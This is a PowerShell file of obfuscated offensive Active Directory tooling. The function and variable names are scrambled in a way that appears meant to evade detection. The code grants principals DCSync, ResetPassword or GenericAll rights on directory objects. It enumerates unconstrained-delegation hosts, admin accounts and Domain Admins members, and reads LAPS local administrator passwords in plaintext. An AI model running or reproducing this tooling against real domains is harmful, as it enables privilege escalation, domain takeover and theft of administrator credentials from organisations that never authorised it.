        $cqsvooMu99 = Get-DomainSearcher -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -pwaAKbSS99 $MgwAvpzd99 -HYMRBpEt99 $TOnJEjRE99 -ZkOZzcfr99 $ZkOZzcfr99
        if(!$VPknkLjI99) {
            $FmFFdwPQ99 = Get-ADObject -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -Name $DnbGaehy99 -niDFhyzI99 $TdPERllW99 -ZkOZzcfr99 $ZkOZzcfr99
            
            if(!$FmFFdwPQ99) {
                throw "Error resolving principal"
            }
            $VPknkLjI99 = $FmFFdwPQ99.objectsid
        }
        if(!$VPknkLjI99) {
            throw "Error resolving principal"
        }
    }
    process {
        if ($cqsvooMu99) {
            if($ytEDRRfH99) {
                $cqsvooMu99.filter="(&(samaccountname=$ytEDRRfH99)(name=$ClgXBKAp99)(distinguishedname=$eSAAMxXN99)$UoyeCNih99)"  
            }
            else {
                $cqsvooMu99.filter="(&(name=$ClgXBKAp99)(distinguishedname=$eSAAMxXN99)$UoyeCNih99)"  
            }
  
            try {
                $cqsvooMu99.FindAll() | Where-Object {$_} | ForEach-Object {
                    $MGMwjphG99 = $_.Properties.distinguishedname
                    $nitPywLV99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$VPknkLjI99)
                    $ffDxFKzJ99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
                    $DaEvWjdc99 = [System.Security.AccessControl.AccessControlType] "Allow"
                    $ACEs = @()
                    if($CMjugcxf99) {
                        $GUIDs = @($CMjugcxf99)
                    }
                    else {
                        $GUIDs = Switch ($cIaYlOpY99) {
                            "ResetPassword" { "00299570-246d-11d0-a768-00aa006e0529" }
                            "WriteMembers" { "bf9679c0-0de6-11d0-a285-00aa003049e2" }
                            "DCSync" { "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2", "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2", "89e95b76-444d-4c62-991a-0facbeda640c"}
                        }
                    }
                    if($GUIDs) {
                        foreach($GUID in $GUIDs) {
                            $cBIIhjGo99 = New-Object Guid $GUID
                            $QLmESvHV99 = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $nitPywLV99,$QLmESvHV99,$DaEvWjdc99,$cBIIhjGo99,$ffDxFKzJ99
                        }
                    }
                    else {
                        $QLmESvHV99 = [System.DirectoryServices.ActiveDirectoryRights] "GenericAll"
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $nitPywLV99,$QLmESvHV99,$DaEvWjdc99,$ffDxFKzJ99
                    }
                    Write-Verbose "Granting principal $VPknkLjI99 '$cIaYlOpY99' on $($_.Properties.distinguishedname)"
                    try {
                        ForEach ($ACE in $ACEs) {
                            Write-Verbose "Granting principal $VPknkLjI99 '$($ACE.ObjectType)' rights on $($_.Properties.distinguishedname)"
                            $Object = [adsi]($_.path)
                            $Object.PsBase.ObjectSecurity.AddAccessRule($ACE)
                            $Object.PsBase.commitchanges()
                        }
                    }
                    catch {
                        Write-Warning "Error granting principal $VPknkLjI99 '$cIaYlOpY99' on $MGMwjphG99 : $_"
                    }
                }
            }
            catch {
                Write-Warning "Error: $_"
            }
        }
    }
}
filter Get-GUIDMap {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $bSMYmVPO99,
        [String]
        $QZblrLyX99,
        [ValidateRange(1,10000)] 
        [Int]
        $ZkOZzcfr99 = 200,
        
        [Management.Automation.PSCredential]
        $btmlSobu99
    )
    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}
    $yBJVWmqO99 = (Get-NetForest -btmlSobu99 $btmlSobu99).schema.name
    $fphiJgYr99 = Get-DomainSearcher -pwaAKbSS99 $yBJVWmqO99 -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -ZkOZzcfr99 $ZkOZzcfr99 -btmlSobu99 $btmlSobu99
    if($fphiJgYr99) {
        $fphiJgYr99.filter = "(schemaIDGUID=*)"
        try {
            $fphiJgYr99.FindAll() | Where-Object {$_} | ForEach-Object {
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
        }
        catch {
            Write-Debug "Error in building GUID map: $_"
        }
    }
    $VMYpSgxG99 = Get-DomainSearcher -pwaAKbSS99 $yBJVWmqO99.replace("Schema","Extended-Rights") -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -ZkOZzcfr99 $ZkOZzcfr99 -btmlSobu99 $btmlSobu99
    if ($VMYpSgxG99) {
        $VMYpSgxG99.filter = "(objectClass=controlAccessRight)"
        try {
            $VMYpSgxG99.FindAll() | Where-Object {$_} | ForEach-Object {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
        }
        catch {
            Write-Debug "Error in building GUID map: $_"
        }
    }
    $GUIDs
}
function electrocardiogram {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ztduaZgG99 = '*',
        [String]
        $SPN,
        [String]
        $lETznzbX99,
        [String]
        $QZDvwDAl99,
        [String]
        $vhlJrvVc99,
        [Switch]
        $lqAYWtEl99,
        [Switch]
        $Ping,
        [Switch]
        $hufPnAJz99,
        [String]
        $bSMYmVPO99,
        [String]
        $QZblrLyX99,
        [String]
        $pwaAKbSS99,
        [String]
        $AFQZcOhk99,
        [Switch]
        $ZLkALtCn99,
        [ValidateRange(1,10000)] 
        [Int]
        $ZkOZzcfr99 = 200,
        [Management.Automation.PSCredential]
        $btmlSobu99
    )
    begin {
        $lcchKTof99 = Get-DomainSearcher -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -pwaAKbSS99 $pwaAKbSS99 -ZkOZzcfr99 $ZkOZzcfr99 -btmlSobu99 $btmlSobu99
    }
    process {
        if ($lcchKTof99) {
            if($ZLkALtCn99) {
                Write-Verbose "Searching for computers with for unconstrained delegation"
                $vhlJrvVc99 += "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            }
            if($lqAYWtEl99) {
                Write-Verbose "Searching for printers"
                $vhlJrvVc99 += "(objectCategory=printQueue)"
            }
            if($SPN) {
                Write-Verbose "Searching for computers with SPN: $SPN"
                $vhlJrvVc99 += "(servicePrincipalName=$SPN)"
            }
            if($lETznzbX99) {
                $vhlJrvVc99 += "(operatingsystem=$lETznzbX99)"
            }
            if($QZDvwDAl99) {
                $vhlJrvVc99 += "(operatingsystemservicepack=$QZDvwDAl99)"
            }
            if($AFQZcOhk99) {
                $vhlJrvVc99 += "(serverreferencebl=$AFQZcOhk99)"
            }
            $sWYxRwFf99 = "(&(sAMAccountType=805306369)(dnshostname=$ztduaZgG99)$vhlJrvVc99)"
            Write-Verbose "electrocardiogram filter : '$sWYxRwFf99'"
            $lcchKTof99.filter = $sWYxRwFf99
            try {
                $lcchKTof99.FindAll() | Where-Object {$_} | ForEach-Object {
                    $Up = $True
                    if($Ping) {
                        $Up = Test-Connection -Count 1 -Quiet -ztduaZgG99 $_.properties.dnshostname
                    }
                    if($Up) {
                        if ($hufPnAJz99) {
                            vanquishing -jJhdUgEl99 $_.Properties
                        }
                        else {
                            $_.properties.dnshostname
                        }
                    }
                }
            }
            catch {
                Write-Warning "Error: $_"
            }
        }
    }
}
function Narnia {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $kbyomDLW99 = '*',
        [String]
        $GUID,
        [String]
        $bSMYmVPO99,
        [String]
        $QZblrLyX99,
        [String]
        $pwaAKbSS99,
        [Switch]
        $hufPnAJz99,
        [ValidateRange(1,10000)] 
        [Int]
        $ZkOZzcfr99 = 200,
        [Management.Automation.PSCredential]
        $btmlSobu99
    )
    begin {
        $AiekWMSw99 = Get-DomainSearcher -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -btmlSobu99 $btmlSobu99 -pwaAKbSS99 $pwaAKbSS99 -ZkOZzcfr99 $ZkOZzcfr99
    }
    process {
        if ($AiekWMSw99) {
            if ($GUID) {
                $AiekWMSw99.filter="(&(objectCategory=organizationalUnit)(name=$kbyomDLW99)(gplink=*$GUID*))"
            }
            else {
                $AiekWMSw99.filter="(&(objectCategory=organizationalUnit)(name=$kbyomDLW99))"
            }
            try {
                $AiekWMSw99.FindAll() | Where-Object {$_} | ForEach-Object {
                    if ($hufPnAJz99) {
                        vanquishing -jJhdUgEl99 $_.Properties
                    }
                    else { 
                        $_.properties.adspath
                    }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}
function carbonates {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $TFiEFauv99 = '*',
        [String]
        $SID,
        [String]
        $DSKIjnpE99,
        [String]
        $vhlJrvVc99,
        [String]
        $bSMYmVPO99,
        
        [String]
        $QZblrLyX99,
        
        [String]
        $pwaAKbSS99,
        [Switch]
        $tfIgBzdw99,
        [Switch]
        $hufPnAJz99,
        [Switch]
        $gwhKSQcx99,
        [ValidateRange(1,10000)] 
        [Int]
        $ZkOZzcfr99 = 200,
        [Management.Automation.PSCredential]
        $btmlSobu99
    )
    begin {
        $uAJagYiv99 = Get-DomainSearcher -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -btmlSobu99 $btmlSobu99 -pwaAKbSS99 $pwaAKbSS99 -ZkOZzcfr99 $ZkOZzcfr99
    }
    process {
        if($uAJagYiv99) {
            if($tfIgBzdw99) {
                Write-Verbose "Checking for adminCount=1"
                $vhlJrvVc99 += "(admincount=1)"
            }
            if ($DSKIjnpE99) {
                $User = Get-ADObject -niDFhyzI99 $DSKIjnpE99 -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -btmlSobu99 $btmlSobu99 -ReturnRaw -ZkOZzcfr99 $ZkOZzcfr99
                $fiGaUlif99 = $User.GetDirectoryEntry()
                $fiGaUlif99.RefreshCache("tokenGroups")
                $fiGaUlif99.TokenGroups | ForEach-Object {
                    $aFgcAxUB99 = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                    
                    if(!($aFgcAxUB99 -match '^S-1-5-32-545|-513$')) {
                        if($hufPnAJz99) {
                            Get-ADObject -SID $aFgcAxUB99 -ZkOZzcfr99 $ZkOZzcfr99 -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -btmlSobu99 $btmlSobu99
                        }
                        else {
                            if($gwhKSQcx99) {
                                $aFgcAxUB99
                            }
                            else {
                                Convert-SidToName $aFgcAxUB99
                            }
                        }
                    }
                }
            }
            else {
                if ($SID) {
                    $uAJagYiv99.filter = "(&(objectCategory=group)(objectSID=$SID)$vhlJrvVc99)"
                }
                else {
                    $uAJagYiv99.filter = "(&(objectCategory=group)(name=$TFiEFauv99)$vhlJrvVc99)"
                }
            
                $uAJagYiv99.FindAll() | Where-Object {$_} | ForEach-Object {
                    if ($hufPnAJz99) {
                        vanquishing -jJhdUgEl99 $_.Properties
                    }
                    else {
                        $_.properties.samaccountname
                    }
                }
            }
        }
    }
}
function kumquats {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $TFiEFauv99,
        [String]
        $SID,
        [String]
        $bSMYmVPO99,
        [String]
        $QZblrLyX99,
        [String]
        $pwaAKbSS99,
        [Switch]
        $hufPnAJz99,
        [Switch]
        $qYWdisPM99,
        [Switch]
        $ZfJKBODT99,
        [ValidateRange(1,10000)] 
        [Int]
        $ZkOZzcfr99 = 200,
        [Management.Automation.PSCredential]
        $btmlSobu99
    )
    begin {
        $uAJagYiv99 = Get-DomainSearcher -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -btmlSobu99 $btmlSobu99 -pwaAKbSS99 $pwaAKbSS99 -ZkOZzcfr99 $ZkOZzcfr99
        if(!$QZblrLyX99) {
            $QZblrLyX99 = ((Get-NetDomain -btmlSobu99 $btmlSobu99).PdcRoleOwner).Name
        }
        if(!$bSMYmVPO99) {
            $bSMYmVPO99 = Get-NetDomain -btmlSobu99 $btmlSobu99
        }
    }
    process {
        if ($uAJagYiv99) {
            if ($qYWdisPM99 -and $ZfJKBODT99) {
                if ($TFiEFauv99) {
                    $Group = carbonates -TFiEFauv99 $TFiEFauv99 -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -btmlSobu99 $btmlSobu99 -hufPnAJz99 -ZkOZzcfr99 $ZkOZzcfr99
                }
                elseif ($SID) {
                    $Group = carbonates -SID $SID -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -btmlSobu99 $btmlSobu99 -hufPnAJz99 -ZkOZzcfr99 $ZkOZzcfr99
                }
                else {
                    $SID = (Get-DomainSID -bSMYmVPO99 $bSMYmVPO99 -btmlSobu99 $btmlSobu99) + "-512"
                    $Group = carbonates -SID $SID -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -btmlSobu99 $btmlSobu99 -hufPnAJz99 -ZkOZzcfr99 $ZkOZzcfr99
                }
                $ngrwCrZG99 = $Group.distinguishedname
                $XUaHklRL99 = $Group.name
                if ($ngrwCrZG99) {
                    $uAJagYiv99.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$ngrwCrZG99)$vhlJrvVc99)"
                    $uAJagYiv99.PropertiesToLoad.AddRange(('distinguishedName','samaccounttype','lastlogon','lastlogontimestamp','dscorepropagationdata','objectsid','whencreated','badpasswordtime','accountexpires','iscriticalsystemobject','name','usnchanged','objectcategory','description','codepage','instancetype','countrycode','distinguishedname','cn','admincount','logonhours','objectclass','logoncount','usncreated','useraccountcontrol','objectguid','primarygroupid','lastlogoff','samaccountname','badpwdcount','whenchanged','memberof','pwdlastset','adspath'))
                    $PukTqINE99 = $uAJagYiv99.FindAll()
                    $XUaHklRL99 = $TFiEFauv99
                }
                else {
                    Write-Error "Unable to find Group"
                }
            }
            else {
                if ($TFiEFauv99) {
                    $uAJagYiv99.filter = "(&(objectCategory=group)(name=$TFiEFauv99)$vhlJrvVc99)"
                }
                elseif ($SID) {
                    $uAJagYiv99.filter = "(&(objectCategory=group)(objectSID=$SID)$vhlJrvVc99)"
                }
                else {
                    $SID = (Get-DomainSID -bSMYmVPO99 $bSMYmVPO99 -btmlSobu99 $btmlSobu99) + "-512"
                    $uAJagYiv99.filter = "(&(objectCategory=group)(objectSID=$SID)$vhlJrvVc99)"
                }
                $uAJagYiv99.FindAll() | ForEach-Object {
                    try {
                        if (!($_) -or !($_.properties) -or !($_.properties.name)) { continue }
                        $XUaHklRL99 = $_.properties.name[0]
                        $PukTqINE99 = @()
                        if ($_.properties.member.Count -eq 0) {
                            $beOMNfjS99 = $False
                            $KzLRylCv99 = 0
                            $Top = 0
                            while(!$beOMNfjS99) {
                                $Top = $KzLRylCv99 + 1499
                                $pqWtxEkj99="member;range=$KzLRylCv99-$Top"
                                $KzLRylCv99 += 1500
                                $uAJagYiv99.PropertiesToLoad.Clear()
                                [void]$uAJagYiv99.PropertiesToLoad.Add("$pqWtxEkj99")
                                try {
                                    $XkRNugKB99 = $uAJagYiv99.FindOne()
                                    if ($XkRNugKB99) {
                                        $WcUtujng99 = $_.Properties.PropertyNames -like "member;range=*"
                                        $NQVzBXmx99 = $_.Properties.item($WcUtujng99)
                                        if ($NQVzBXmx99.count -eq 0) {
                                            $beOMNfjS99 = $True
                                        }
                                        else {
                                            $NQVzBXmx99 | ForEach-Object {
                                                $PukTqINE99 += $_
                                            }
                                        }
                                    }
                                    else {
                                        $beOMNfjS99 = $True
                                    }
                                } 
                                catch [System.Management.Automation.MethodInvocationException] {
                                    $beOMNfjS99 = $True
                                }
                            }
                        } 
                        else {
                            $PukTqINE99 = $_.properties.member
                        }
                    } 
                    catch {
                        Write-Verbose $_
                    }
                }
            }
            $PukTqINE99 | Where-Object {$_} | ForEach-Object {
                if ($qYWdisPM99 -and $ZfJKBODT99) {
                    $jJhdUgEl99 = $_.Properties
                } 
                else {
                    if($QZblrLyX99) {
                        $XkRNugKB99 = [adsi]"LDAP://$QZblrLyX99/$_"
                    }
                    else {
                        $XkRNugKB99 = [adsi]"LDAP://$_"
                    }
                    if($XkRNugKB99){
                        $jJhdUgEl99 = $XkRNugKB99.Properties
                    }
                }
                if($jJhdUgEl99) {
                    $WJptxSQF99 = @('268435456','268435457','536870912','536870913') -contains $jJhdUgEl99.samaccounttype
                    if ($hufPnAJz99) {
                        $MyjmjFFE99 = vanquishing -jJhdUgEl99 $jJhdUgEl99
                    }
                    else {
                        $MyjmjFFE99 = New-Object PSObject
                    }
                    $MyjmjFFE99 | Add-Member Noteproperty 'GroupDomain' $bSMYmVPO99
                    $MyjmjFFE99 | Add-Member Noteproperty 'GroupName' $XUaHklRL99
                    try {
                        $Fjjwusdi99 = $jJhdUgEl99.distinguishedname[0]
                        
                        $DCkYjwQD99 = $Fjjwusdi99.subString($Fjjwusdi99.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'
                    }
                    catch {
                        $Fjjwusdi99 = $Null
                        $DCkYjwQD99 = $Null
                    }
                    if ($jJhdUgEl99.samaccountname) {
                        $WiXAVSlm99 = $jJhdUgEl99.samaccountname[0]
                    } 
                    else {
                        try {
                            $WiXAVSlm99 = Convert-SidToName $jJhdUgEl99.cn[0]
                        }
                        catch {
                            $WiXAVSlm99 = $jJhdUgEl99.cn
                        }
                    }
                    
                    if($jJhdUgEl99.objectSid) {
                        $HJZjisMG99 = ((New-Object System.Security.Principal.SecurityIdentifier $jJhdUgEl99.objectSid[0],0).Value)
                    }
                    else {
                        $HJZjisMG99 = $Null
                    }
                    $MyjmjFFE99 | Add-Member Noteproperty 'MemberDomain' $DCkYjwQD99
                    $MyjmjFFE99 | Add-Member Noteproperty 'MemberName' $WiXAVSlm99
                    $MyjmjFFE99 | Add-Member Noteproperty 'MemberSid' $HJZjisMG99
                    $MyjmjFFE99 | Add-Member Noteproperty 'IsGroup' $WJptxSQF99
                    $MyjmjFFE99 | Add-Member Noteproperty 'MemberDN' $Fjjwusdi99
                    $MyjmjFFE99
                    if ($qYWdisPM99 -and !$ZfJKBODT99 -and $WJptxSQF99 -and $WiXAVSlm99) {
                        if($hufPnAJz99) {
                            kumquats -hufPnAJz99 -bSMYmVPO99 $DCkYjwQD99 -QZblrLyX99 $QZblrLyX99 -btmlSobu99 $btmlSobu99 -TFiEFauv99 $WiXAVSlm99 -qYWdisPM99 -ZkOZzcfr99 $ZkOZzcfr99
                        }
                        else {
                            kumquats -bSMYmVPO99 $DCkYjwQD99 -QZblrLyX99 $QZblrLyX99 -btmlSobu99 $btmlSobu99 -TFiEFauv99 $WiXAVSlm99 -qYWdisPM99 -ZkOZzcfr99 $ZkOZzcfr99
                        }
                    }
                }
            }
        }
    }
}
function clovers {

    param(
        [Parameter(Position=0, ValueFromPipeline=$True)]
        [String]
        $DSKIjnpE99,

        [String]
        $bSMYmVPO99,

        [String]
        $QZblrLyX99,

        [String]
        $pwaAKbSS99,

        [String]
        $vhlJrvVc99,

        [Switch]
        $SPN,

        [Switch]
        $tfIgBzdw99,

        [Switch]
        $ZLkALtCn99,

        [Switch]
        $QvVWYJJn99,

        [ValidateRange(1,10000)] 
        [Int]
        $ZkOZzcfr99 = 200,

        [Management.Automation.PSCredential]
        $btmlSobu99
    )

    begin {
        $FoBdglbr99 = Get-DomainSearcher -bSMYmVPO99 $bSMYmVPO99 -pwaAKbSS99 $pwaAKbSS99 -QZblrLyX99 $QZblrLyX99 -ZkOZzcfr99 $ZkOZzcfr99 -btmlSobu99 $btmlSobu99
    }

    process {
        if($FoBdglbr99) {

            if($ZLkALtCn99) {
                Write-Verbose "Checking for unconstrained delegation"
                $vhlJrvVc99 += "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            }
            if($QvVWYJJn99) {
                Write-Verbose "Checking for users who can be delegated"
                $vhlJrvVc99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))"
            }
            if($tfIgBzdw99) {
                Write-Verbose "Checking for adminCount=1"
                $vhlJrvVc99 += "(admincount=1)"
            }

            if($DSKIjnpE99) {
                $FoBdglbr99.filter="(&(samAccountType=805306368)(samAccountName=$DSKIjnpE99)$vhlJrvVc99)"
            }
            elseif($SPN) {
                $FoBdglbr99.filter="(&(samAccountType=805306368)(servicePrincipalName=*)$vhlJrvVc99)"
            }
            else {
                $FoBdglbr99.filter="(&(samAccountType=805306368)$vhlJrvVc99)"
            }

            $NQVzBXmx99 = $FoBdglbr99.FindAll()
            $NQVzBXmx99 | Where-Object {$_} | ForEach-Object {
                $User = vanquishing -jJhdUgEl99 $_.Properties
                $User.PSObject.TypeNames.Add('PowerView.User')
                $User
            }
            $NQVzBXmx99.dispose()
            $FoBdglbr99.dispose()
        }
    }
}
function routine {
    [CmdletBinding()]
    param(
        [String]
        $bSMYmVPO99,
        [String]
        $QZblrLyX99,
        [String]
        $ztduaZgG99,
        [String]
        $vhlJrvVc99 = "(objectCategory=Computer)(ms-mcs-admpwdexpirationtime=*)",
        [Switch]
        $xRVeDRrO99,
        [ValidateRange(1,10000)]
        [Int]
        $ZkOZzcfr99 = 200,
        [Management.Automation.PSCredential]
        $btmlSobu99
    )
    begin {
        if($ztduaZgG99) { 
            $velnNDyT99 = "$vhlJrvVc99(dNSHostName=$ztduaZgG99)"
        }
        else {
            $velnNDyT99 = "$vhlJrvVc99"
        }
        Write-Verbose "Retrieving all ExtendedRight ACLs for domain $bSMYmVPO99"
        $hHLnqMxe99 = Sufism -SdOIyelb99 -vhlJrvVc99 $velnNDyT99 -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -btmlSobu99 $btmlSobu99 -ZkOZzcfr99 $ZkOZzcfr99 | Where-Object { $_.ActiveDirectoryRights -match "ExtendedRight" }
        
        $IdBLycUS99 = @{}
        $iQnquCll99 = electrocardiogram -vhlJrvVc99 "(ms-mcs-admpwdexpirationtime=*)" -hufPnAJz99 -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -btmlSobu99 $btmlSobu99 | ForEach-Object { $IdBLycUS99.Add($_.distinguishedname, $_.dnshostname) }
        if($btmlSobu99){
            Write-Verbose "Retrieving all users and groups to resolve SIDs when using PSCredential"
            $JJtPgVxn99 = @{}
            clovers -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -btmlSobu99 $btmlSobu99 | ForEach-Object { $JJtPgVxn99.Add($_.objectsid, $_.samaccountname) }
            carbonates -hufPnAJz99 -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -btmlSobu99 $btmlSobu99 | ForEach-Object { $JJtPgVxn99.Add($_.objectsid, $_.samaccountname) }
        }
    }
    process {
        $hHLnqMxe99 | ForEach-Object {
            $ztduaZgG99 =  $IdBLycUS99[$_.ObjectDN]
            Write-Verbose "Parsing ACLs for $ztduaZgG99"
            $nitPywLV99 = $_.IdentityReference
            if($_.ObjectType -match "ms-Mcs-AdmPwd" -and !($xRVeDRrO99)) {
                $ftVZPbQX99 = "Delegated"
            } 
            elseif($_.ObjectType -match "All" -and $_.IdentityReference -notmatch "BUILTIN") {
                $ftVZPbQX99 = "All"
            }
            else { return }
            if($btmlSobu99) {
                if($JJtPgVxn99.Contains($nitPywLV99.ToString())) {
                    $nitPywLV99 = $JJtPgVxn99[$nitPywLV99.ToString()]
                }
            }
            $eMAlQwiC99 = New-Object PSObject
            $eMAlQwiC99 | Add-Member Noteproperty 'ComputerName' "$ztduaZgG99"
            $eMAlQwiC99 | Add-Member Noteproperty 'Identity' "$nitPywLV99"
            $eMAlQwiC99 | Add-Member Noteproperty 'Reason' "$ftVZPbQX99"
            $eMAlQwiC99
        } 
    }
}
function pasta {
    [CmdletBinding()]
    param(
        [String]
        $QZblrLyX99,
        [String]
        $bSMYmVPO99,
        [ValidateRange(1,10000)]
        [Int]
        $ZkOZzcfr99 = 200,
        [Management.Automation.PSCredential]
        $btmlSobu99
    )
    Narnia -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -btmlSobu99 $btmlSobu99 -hufPnAJz99 |
     Sufism -bSMYmVPO99 $bSMYmVPO99 -QZblrLyX99 $QZblrLyX99 -btmlSobu99 $btmlSobu99 -SdOIyelb99 | Where-Object {
        ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and 
        ($_.ActiveDirectoryRights -match 'ReadProperty')
    } | ForEach-Object {
        $dn = $_.ObjectDN
        $ir = $_.IdentityReference
        $FImJBccL99 = New-Object PSObject
        $FImJBccL99 | Add-Member NoteProperty 'OrgUnit' "$dn"
        $FImJBccL99 | Add-Member Noteproperty 'Delegated Groups' "$ir"
        $FImJBccL99
    }
}
function barbed {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ztduaZgG99 = '*',
        [String]
        $SPN,
        [String]
        $bSMYmVPO99,
        [String]
        $QZblrLyX99,
        [String]
        $pwaAKbSS99,
        [String]
        $AFQZcOhk99,
        [Switch]
        $ZLkALtCn99,
        [ValidateRange(1,10000)] 
        [Int]
        $ZkOZzcfr99 = 200,
        [Management.Automation.PSCredential]
        $btmlSobu99
    )
    process {
        electrocardiogram -hufPnAJz99 -vhlJrvVc99 "(ms-mcs-admpwdexpirationtime=*)" @PSBoundParameters | ForEach-Object {
            $CeFJPYSK99 = $_.dnshostname
            $KfweNBBE99 = $_."ms-mcs-admpwd"
            If ($_."ms-MCS-AdmPwdExpirationTime" -ge 0) {
                $EJNvSgSm99 = $([datetime]::FromFileTime([convert]::ToInt64($_."ms-MCS-AdmPwdExpirationTime",10)))
            }
            Else{
                $EJNvSgSm99 = "N/A"
            }
            $GuRXGpTJ99 = New-Object PSObject
            $GuRXGpTJ99 | Add-Member NoteProperty 'ComputerName' "$CeFJPYSK99"
            $GuRXGpTJ99 | Add-Member Noteproperty 'Password' "$KfweNBBE99"
            $GuRXGpTJ99 | Add-Member Noteproperty 'Expiration' "$EJNvSgSm99"
            $GuRXGpTJ99        
        }
    }
}
